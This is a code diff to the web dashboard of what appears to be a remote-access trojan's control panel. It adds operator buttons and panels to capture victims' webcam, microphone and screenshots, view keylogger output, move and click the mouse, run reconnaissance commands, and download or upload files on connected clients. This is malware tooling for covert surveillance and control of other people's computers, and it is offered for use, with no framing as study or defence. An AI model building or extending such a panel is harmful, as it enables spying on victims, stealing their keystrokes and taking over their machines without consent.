@@ -202,6 +202,9 @@
         .panel-icon.terminal { background: var(--accent-purple); color: white; }
         .panel-icon.files { background: var(--accent-amber); color: white; }
         .panel-icon.network { background: var(--accent-green); color: white; }
+        .panel-icon.system { background: var(--accent-purple); color: white; }
+        .panel-icon.media { background: var(--accent-amber); color: white; }
+        .panel-icon.keylog { background: var(--accent-red); color: white; }
 
         .panel-title {
             font-size: clamp(0.875rem, 2.5vw, 1.1rem);
@@ -287,6 +290,16 @@
             transform: translateY(-2px);
         }
 
+        .upload-section {
+            margin-bottom: 1rem;
+        }
+
+        .upload-form {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 1rem;
+        }
+
         .command-form {
             display: grid;
             grid-template-columns: 1fr;
@@ -296,6 +309,9 @@
         @media (min-width: 640px) {
             .command-form {
                 grid-template-columns: 1fr 2fr auto;
+            }
+            .upload-form {
+                grid-template-columns: 1fr auto;
             }
         }
 
@@ -367,6 +383,15 @@
             white-space: pre-wrap;
         }
 
+        .system-graph, .network-graph {
+            height: clamp(200px, 40vh, 300px);
+            background: rgba(10, 14, 26, 0.5);
+            border: 1px solid var(--border-primary);
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+
         .files-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
@@ -435,12 +460,45 @@
             text-align: center;
         }
 
-        .network-graph {
-            height: clamp(200px, 40vh, 300px);
+        .media-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .media-item {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-primary);
+            border-radius: 0.75rem;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .media-item:hover {
+            border-color: var(--accent-green);
+            background: var(--bg-tertiary);
+        }
+
+        .media-preview {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 0.5rem;
+        }
+
+        .keylog-container {
             background: rgba(10, 14, 26, 0.5);
             border: 1px solid var(--border-primary);
             border-radius: 0.75rem;
             padding: 1rem;
+            height: clamp(150px, 30vh, 250px);
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-green);
+            white-space: pre-wrap;
         }
 
         /* Scrollbar Styling */
@@ -480,13 +538,17 @@
                 max-height: 200px;
             }
 
-            .output-container, .network-graph {
+            .output-container, .system-graph, .network-graph, .keylog-container {
                 height: 200px;
             }
 
             .btn, .quick-action-btn {
                 width: 100%;
                 justify-content: center;
+            }
+
+            .media-section {
+                grid-template-columns: 1fr;
             }
         }
     </style>
@@ -563,6 +625,27 @@
                             <button class="quick-action-btn" data-command="whoami">Get Username</button>
                             <button class="quick-action-btn" data-command="systeminfo" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'systeminfo' : 'uname -a')">System Info</button>
                             <button class="quick-action-btn" data-command="netstat -an" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'netstat -an' : 'netstat -tuln')">Network Scan</button>
+                            <button class="quick-action-btn" data-command="ipconfig" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'ipconfig' : 'ifconfig')">IP Config</button>
+                            <button class="quick-action-btn" data-command="tasklist" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'tasklist' : 'ps aux')">Task List</button>
+                            <button class="quick-action-btn" data-command="top" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'tasklist' : 'top -n 1')">Top Processes</button>
+                            <button class="quick-action-btn" data-command="df -h" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'dir' : 'df -h')">Disk Usage</button>
+                            <button class="quick-action-btn" data-command="dir" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'dir' : 'ls -l')">Directory List</button>
+                            <button class="quick-action-btn" data-command="webcam">Capture Webcam</button>
+                            <button class="quick-action-btn" data-command="mic">Record Mic</button>
+                            <button class="quick-action-btn" data-command="screenshot">Take Screenshot</button>
+                            <button class="quick-action-btn" data-command="move 500 500">Move Mouse</button>
+                            <button class="quick-action-btn" data-command="click left">Click Left</button>
+                            <button class="quick-action-btn" data-command="download C:\\test.txt" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'download C:\\test.txt' : 'download /tmp/test.txt')">Download File</button>
+                        </div>
+
+                        <div class="upload-section">
+                            <form class="upload-form" id="upload-form" enctype="multipart/form-data">
+                                <input type="file" class="form-input" id="upload-input" required>
+                                <button type="submit" class="btn">
+                                    <span>↑</span>
+                                    Upload
+                                </button>
+                            </form>
                         </div>
 
                         <form class="command-form" id="command-form">
@@ -595,6 +678,19 @@
             </div>
         </div>
 
+        <!-- System Monitor Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon system">S</div>
+                <div class="panel-title">System Monitor</div>
+            </div>
+            <div class="panel-content">
+                <div class="system-graph">
+                    <canvas id="system-chart"></canvas>
+                </div>
+            </div>
+        </div>
+
         <!-- Network Traffic Panel -->
         <div class="panel">
             <div class="panel-header">
@@ -605,6 +701,41 @@
                 <div class="network-graph">
                     <canvas id="network-chart"></canvas>
                 </div>
+            </div>
+        </div>
+
+        <!-- Media Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon media">M</div>
+                <div class="panel-title">Media Capture</div>
+            </div>
+            <div class="panel-content">
+                <div class="media-section">
+                    <div class="media-item" id="webcam-preview">
+                        <h4>Webcam</h4>
+                        <img id="webcam-image" class="media-preview" src="" alt="Webcam Preview">
+                    </div>
+                    <div class="media-item" id="screenshot-preview">
+                        <h4>Screenshot</h4>
+                        <img id="screenshot-image" class="media-preview" src="" alt="Screenshot Preview">
+                    </div>
+                </div>
+                <div class="media-item" id="mic-preview">
+                    <h4>Mic Recording</h4>
+                    <audio id="mic-audio" controls></audio>
+                </div>
+            </div>
+        </div>
+
+        <!-- Keylogger Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon keylog">K</div>
+                <div class="panel-title">Keylogger</div>
+            </div>
+            <div class="panel-content">
+                <div class="keylog-container" id="keylog-output">No keystrokes logged yet...</div>
             </div>
         </div>
 
@@ -648,9 +779,78 @@
         const filesList = document.getElementById('files-list');
         const sudoWarning = document.getElementById('sudo-warning');
 
-        // Initialize Chart.js for network traffic
-        const ctx = document.getElementById('network-chart').getContext('2d');
-        const networkChart = new Chart(ctx, {
+        // Initialize Charts
+        const systemCtx = document.getElementById('system-chart').getContext('2d');
+        const systemChart = new Chart(systemCtx, {
+            type: 'line',
+            data: {
+                labels: [],
+                datasets: [
+                    {
+                        label: 'CPU Usage (%)',
+                        data: [],
+                        borderColor: 'rgba(124, 58, 237, 1)',
+                        backgroundColor: 'rgba(124, 58, 237, 0.2)',
+                        fill: true,
+                        tension: 0.4
+                    },
+                    {
+                        label: 'Memory Usage (MB)',
+                        data: [],
+                        borderColor: 'rgba(16, 163, 74, 1)',
+                        backgroundColor: 'rgba(16, 163, 74, 0.2)',
+                        fill: true,
+                        tension: 0.4
+                    }
+                ]
+            },
+            options: {
+                scales: {
+                    x: {
+                        display: true,
+                        title: {
+                            display: true,
+                            text: 'Time',
+                            color: '#b3c4d8'
+                        },
+                        ticks: {
+                            color: '#6b7280',
+                            maxTicksLimit: 10
+                        },
+                        grid: {
+                            color: 'rgba(55, 65, 81, 0.2)'
+                        }
+                    },
+                    y: {
+                        beginAtZero: true,
+                        title: {
+                            display: true,
+                            text: 'Value',
+                            color: '#b3c4d8'
+                        },
+                        ticks: {
+                            color: '#6b7280'
+                        },
+                        grid: {
+                            color: 'rgba(55, 65, 81, 0.2)'
+                        }
+                    }
+                },
+                plugins: {
+                    legend: {
+                        labels: {
+                            color: '#b3c4d8'
+                        }
+                    }
+                },
+                animation: {
+                    duration: 500 // Smooth transitions
+                }
+            }
+        });
+
+        const networkCtx = document.getElementById('network-chart').getContext('2d');
+        const networkChart = new Chart(networkCtx, {
             type: 'line',
             data: {
                 labels: [], // Timestamps
@@ -718,9 +918,9 @@
             }
         });
 
-        // Network data storage for each client
+        const MAX_DATA_POINTS = 20;
         const networkDataMap = new Map();
-        const MAX_DATA_POINTS = 20; // Limit to last 20 points for smooth scrolling
+        const systemDataMap = new Map();
 
         socket.on('client_update', (clients) => {
             clientsList.innerHTML = '';
@@ -776,7 +976,6 @@
             outputDiv.textContent += newOutput;
             outputDiv.scrollTop = outputDiv.scrollHeight;
 
-            // Show warning if sudo failed
             if (output.includes("sudo is blocked")) {
                 sudoWarning.style.display = 'block';
             }
@@ -789,22 +988,18 @@
             const recvSpeed = data.recv_speed_mbps;
 
             if (clientId === selectedClient) {
-                // Update chart for the selected client
                 networkChart.data.labels.push(timestamp);
                 networkChart.data.datasets[0].data.push(sentSpeed);
                 networkChart.data.datasets[1].data.push(recvSpeed);
 
-                // Keep only the last MAX_DATA_POINTS
                 if (networkChart.data.labels.length > MAX_DATA_POINTS) {
                     networkChart.data.labels.shift();
                     networkChart.data.datasets[0].data.shift();
                     networkChart.data.datasets[1].data.shift();
                 }
-
                 networkChart.update();
             }
 
-            // Store data for switching clients
             if (!networkDataMap.has(clientId)) {
                 networkDataMap.set(clientId, { labels: [], sent: [], recv: [] });
             }
@@ -817,6 +1012,70 @@
                 clientData.labels.shift();
                 clientData.sent.shift();
                 clientData.recv.shift();
+            }
+        });
+
+        socket.on('system_data', (data) => {
+            const clientId = data.client_id;
+            const timestamp = new Date(data.timestamp * 1000).toLocaleTimeString();
+            const cpuUsage = data.cpu_usage_percent;
+            const memoryUsage = data.memory_usage_mb;
+
+            if (clientId === selectedClient) {
+                systemChart.data.labels.push(timestamp);
+                systemChart.data.datasets[0].data.push(cpuUsage);
+                systemChart.data.datasets[1].data.push(memoryUsage);
+
+                if (systemChart.data.labels.length > MAX_DATA_POINTS) {
+                    systemChart.data.labels.shift();
+                    systemChart.data.datasets[0].data.shift();
+                    systemChart.data.datasets[1].data.shift();
+                }
+                systemChart.update();
+            }
+
+            if (!systemDataMap.has(clientId)) {
+                systemDataMap.set(clientId, { labels: [], cpu: [], memory: [] });
+            }
+            const clientData = systemDataMap.get(clientId);
+            clientData.labels.push(timestamp);
+            clientData.cpu.push(cpuUsage);
+            clientData.memory.push(memoryUsage);
+
+            if (clientData.labels.length > MAX_DATA_POINTS) {
+                clientData.labels.shift();
+                clientData.cpu.shift();
+                clientData.memory.shift();
+            }
+        });
+
+        socket.on('webcam_data', (data) => {
+            if (data.client_id === selectedClient) {
+                const img = document.getElementById('webcam-image');
+                img.src = `data:image/jpeg;base64,${data.image}`;
+            }
+        });
+
+        socket.on('mic_data', (data) => {
+            if (data.client_id === selectedClient) {
+                const audio = document.getElementById('mic-audio');
+                audio.src = `data:audio/wav;base64,${data.audio}`;
+                audio.play();
+            }
+        });
+
+        socket.on('screenshot_data', (data) => {
+            if (data.client_id === selectedClient) {
+                const img = document.getElementById('screenshot-image');
+                img.src = `data:image/png;base64,${data.image}`;
+            }
+        });
+
+        socket.on('keylog_data', (data) => {
+            if (data.client_id === selectedClient) {
+                const keylogOutput = document.getElementById('keylog-output');
+                keylogOutput.textContent = data.logs || 'No keystrokes logged yet...';
+                keylogOutput.scrollTop = keylogOutput.scrollHeight;
             }
         });
 
@@ -848,12 +1107,17 @@
                 selectedClient = item.getAttribute('data-client-id');
                 clientSelect.value = selectedClient;
 
-                // Update chart for the selected client
-                const clientData = networkDataMap.get(selectedClient) || { labels: [], sent: [], recv: [] };
-                networkChart.data.labels = clientData.labels;
-                networkChart.data.datasets[0].data = clientData.sent;
-                networkChart.data.datasets[1].data = clientData.recv;
+                const networkData = networkDataMap.get(selectedClient) || { labels: [], sent: [], recv: [] };
+                networkChart.data.labels = networkData.labels;
+                networkChart.data.datasets[0].data = networkData.sent;
+                networkChart.data.datasets[1].data = networkData.recv;
                 networkChart.update();
+
+                const systemData = systemDataMap.get(selectedClient) || { labels: [], cpu: [], memory: [] };
+                systemChart.data.labels = systemData.labels;
+                systemChart.data.datasets[0].data = systemData.cpu;
+                systemChart.data.datasets[1].data = systemData.memory;
+                systemChart.update();
             });
         });
 
@@ -878,6 +1142,28 @@
                 const result = await response.json();
                 console.log(`Quick action "${command}" sent to ${selectedClient}: ${result.message}`);
             });
+        });
+
+        // Handle upload form
+        document.getElementById('upload-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const fileInput = document.getElementById('upload-input');
+            const file = fileInput.files[0];
+            if (!file || !selectedClient) {
+                alert('No file or client selected');
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            const response = await fetch('/upload', {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            console.log(result.message);
+            fileInput.value = '';
         });
 
         // Handle command form
